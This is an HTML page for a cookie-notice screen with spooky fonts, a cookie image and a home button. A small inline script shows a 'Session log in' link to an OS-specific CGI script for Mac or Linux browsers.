<!DOCTYPE html>
<html lang="us">

<head>
	<meta charset="UTF-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1" />
	<title>Cookies üç™</title>
	<link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet" />
	<link href="https://fonts.googleapis.com/css2?family=IM+Fell+English+SC&display=swap" rel="stylesheet" />
	<style>
		body {
			font-family: 'IM Fell English SC', serif;
			background-image: url('/img/background.jpg');
			background-size: cover;
			background-position: center;
			background-repeat: no-repeat;
			text-align: center;
			padding: 40px;
			margin: 0;
			min-height: 100vh;
			color: #fff;
		}

		h1 {
			font-family: 'Creepster', cursive;
			color: chocolate;
			font-size: 80px;
			text-shadow: 2px 2px 6px #000, 0 10px 10px rgba(210, 105, 30, 0.5);
			margin-bottom: 30px;
		}

		p {
			font-size: 20px;
			margin-bottom: 30px;
			background-color: rgba(0, 0, 0, 0.5);
			display: inline-block;
			padding: 20px;
			border-radius: 10px;
		}

		.soft-frame {
			border-radius: 15px;
			box-shadow: 0 4px 8px rgba(0, 0, 0, 0.4);
			display: block;
			margin: 20px auto;
			max-width: 400px;
			width: 90%;
			transition: transform 0.3s ease;
		}

		.soft-frame:hover {
			transform: scale(1.05);
		}

		.homepage-button img {
			width: 200px;
			border-radius: 8px;
			transition: transform 0.3s ease, box-shadow 0.3s ease;
		}

		.homepage-button:hover img {
			transform: scale(1.1);
		}

		.cookie-box {
			margin-top: 20px;
			margin-bottom: 20px;
		}

		.cookie-box a {
			display: inline-block;
			background-color: chocolate;
			color: white;
			font-size: 20px;
			font-weight: bold;
			padding: 12px 24px;
			border-radius: 8px;
			text-decoration: none;
			transition: background-color 0.3s;
		}

		.cookie-box a:hover {
			background-color: #a0522d;
		}
	</style>
</head>

<body>
	<h1>Cookies üç™</h1>
	<p>This site uses cookies to enhance your experience. By continuing, you agree to our cookie policy.</p>

	<div class="cookie-box" id="cookie-box"></div>

	<img src="/img/cookie.jpg" alt="Cookie image" class="soft-frame" />

	<a href="/" class="homepage-button">
		<div class="button-wrapper">
			<img src="/img/back_home.png" alt="Retour √† l'accueil" />
		</div>
	</a>

	<script>
		const ua = navigator.userAgent;
		const container = document.getElementById("cookie-box");

		let href = "";

		if (ua.includes("Mac")) {
			href = "/cgi-bin/script_mac.php";
		} else if (ua.includes("Linux")) {
			href = "/cgi-bin/script_linux.php";
		}

		if (href) {
			container.innerHTML = '<a href="' + href + '">Session log in</a>';
		}
	</script>
</body>

</html>
